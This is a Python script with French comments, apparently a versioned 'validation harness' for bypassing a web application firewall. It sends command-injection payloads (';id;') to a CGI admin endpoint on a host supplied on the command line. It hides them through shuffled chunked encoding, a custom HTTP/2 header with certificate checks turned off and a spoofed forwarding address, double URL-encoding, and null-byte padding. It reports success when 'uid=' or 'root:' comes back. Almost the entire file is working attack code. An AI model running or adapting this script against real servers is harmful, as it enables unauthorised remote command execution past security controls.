#!/usr/bin/env python3
# HARNESS-VALIDATION v2.4.0 — contournement WAF.
# Corrige audit §3.9 + revue v2.2 :
#   - HTTP/2 avec négociation ALPN h2
#   - v2.3 : import h2 au niveau module (cache, pas d'overhead par appel)
#   - Variantes dbl_encode et nul_space réellement envoyées
#   - Contexte SSL moderne (create_default_context, pas _create_unverified_context)
#   - v2.4 : try/finally garantit fermeture socket dans h2_request
#   - v2.4 : s.settimeout(5) anti-blocage keep-alive dans send_http1
#   - v2.4 : documentation double-encodage %00
#   - v2.4 : rng.shuffle(frags) ordre chunks non-séquentiel reproductible
import base64
import json
import random
import socket
import ssl
import sys
import urllib.parse as up

# v2.3 : import h2 au niveau module (une seule fois, pas par appel)
try:
    import h2.connection
    import h2.config
    H2_AVAILABLE = True
except ImportError:
    H2_AVAILABLE = False

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
PATH = "/cgi-bin/admin.cgi"
CMD  = "id"


def chunked_split(frags: list[str]) -> dict:
    """Contournement par Transfer-Encoding: chunked.
    Le WAF peut ne pas réassembler les chunks avant inspection."""
    body = "".join(f"{len(f):x}\r\n{f}\r\n" for f in frags) + "0\r\n\r\n"
    req = (
        f"POST {PATH} HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Connection: close\r\n"
        f"\r\n{body}"
    ).encode()
    try:
        s = socket.create_connection((HOST, PORT), timeout=5)
        s.sendall(req)
        resp = b""
        while True:
            try:
                c = s.recv(4096)
                if not c:
                    break
                resp += c
            except socket.timeout:
                break
        s.close()
        return {"ok": b"uid=" in resp or b"root:" in resp, "len": len(resp)}
    except OSError as e:
        return {"error": type(e).__name__}


def h2_request(payload: str) -> dict:
    """Contournement via HTTP/2 header personnalisé.
    Nécessite ALPN h2 négocié (TLS)."""
    # v2.3 : vérification au niveau module (pas d'import par appel)
    if not H2_AVAILABLE:
        return {"error": "h2_not_installed", "skipped": True,
                "hint": "pip install h2==4.1.0"}

    try:
        # Tentative TLS avec ALPN h2
        sock = socket.create_connection((HOST, PORT), timeout=5)
    except OSError as e:
        return {"error": type(e).__name__}
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_alpn_protocols(["h2", "http/1.1"])
        sock = ctx.wrap_socket(sock, server_hostname=HOST)
        proto = sock.selected_alpn_protocol()
        if proto != "h2":
            return {"error": f"alpn_negotiated_{proto}_not_h2",
                    "hint": "serveur doit supporter HTTP/2 over TLS"}
        conf = h2.config.H2Configuration(
            client_side=True, header_encoding="utf-8")
        conn = h2.connection.H2Connection(config=conf)
        conn.initiate_connection()
        sock.sendall(conn.data_to_send())
        sid = conn.get_next_available_stream_id()
        conn.send_headers(sid, [
            (":method", "GET"),
            (":path", PATH),
            (":authority", f"{HOST}:{PORT}"),
            (":scheme", "https"),
            ("x-forwarded-for", "127.0.0.1"),
            ("x-payload", payload),
        ], end_stream=True)
        sock.sendall(conn.data_to_send())
        resp = b""
        while True:
            try:
                c = sock.recv(65535)
                if not c:
                    break
                resp += c
            except socket.timeout:
                break
        return {"ok": b"uid=" in resp or b"root:" in resp, "len": len(resp)}
    except ssl.SSLError as e:
        return {"error": f"tls_failed: {type(e).__name__}"}
    except Exception as e:
        return {"error": type(e).__name__}
    finally:
        # v2.4 : socket toujours fermée (même sur return anticipé / exception)
        try:
            sock.close()
        except Exception:
            pass


def send_http1(payload: str, method: str = "GET") -> dict:
    """Envoi HTTP/1.1 simple pour les variantes dbl_encode et nul_space."""
    try:
        if method == "GET":
            path_with_payload = f"{PATH}?device_id={up.quote(payload, safe='')}"
            req = (
                f"GET {path_with_payload} HTTP/1.1\r\n"
                f"Host: {HOST}:{PORT}\r\n"
                f"Connection: close\r\n"
                f"\r\n"
            ).encode()
        else:
            body = f"device_id={up.quote(payload, safe='')}"
            req = (
                f"POST {PATH} HTTP/1.1\r\n"
                f"Host: {HOST}:{PORT}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(body)}\r\n"
                f"Connection: close\r\n"
                f"\r\n{body}"
            ).encode()
        s = socket.create_connection((HOST, PORT), timeout=5)
        s.settimeout(5)  # v2.4 : éviter blocage infini sur keep-alive
        s.sendall(req)
        resp = b""
        while True:
            try:
                c = s.recv(4096)
                if not c:
                    break
                resp += c
            except socket.timeout:
                break
        s.close()
        return {"ok": b"uid=" in resp or b"root:" in resp, "len": len(resp)}
    except OSError as e:
        return {"error": type(e).__name__}


def main():
    rng = random.Random(int(sys.argv[3]) if len(sys.argv) > 3 else 1337)
    frags = ["device_id=1337", f"%3B{CMD}%3B", "&action=bypass_check"]
    rng.shuffle(frags)  # v2.4 : ordre des chunks reproductible mais non-séquentiel

    # Variante dbl_encode : double encodage URL
    dbl_payload = up.quote(up.quote(f";{CMD};", safe=""), safe="")

    # Variante nul_space : null byte + tab
    # Note : %00 est déjà encodé URL. send_http1() applique up.quote() dessus,
    # ce qui produit %2500 (double-encodage). C'est intentionnel pour tester si
    # le WAF décode correctement les double-encodings.
    nul_payload = f"%00;{CMD}%09;"

    results = {
        "chunked": chunked_split(frags),
        "h2_custom": h2_request(f";{CMD};"),
        "dbl_encode": send_http1(dbl_payload),
        "nul_space": send_http1(nul_payload),
    }
    print(json.dumps({
        "module": "waf_bypass",
        "target": f"{HOST}:{PORT}",
        "results": results,
        "any_bypass": any(
            r.get("ok") for r in results.values()
            if isinstance(r, dict)
        ),
    }, indent=2))


if __name__ == "__main__":
    main()
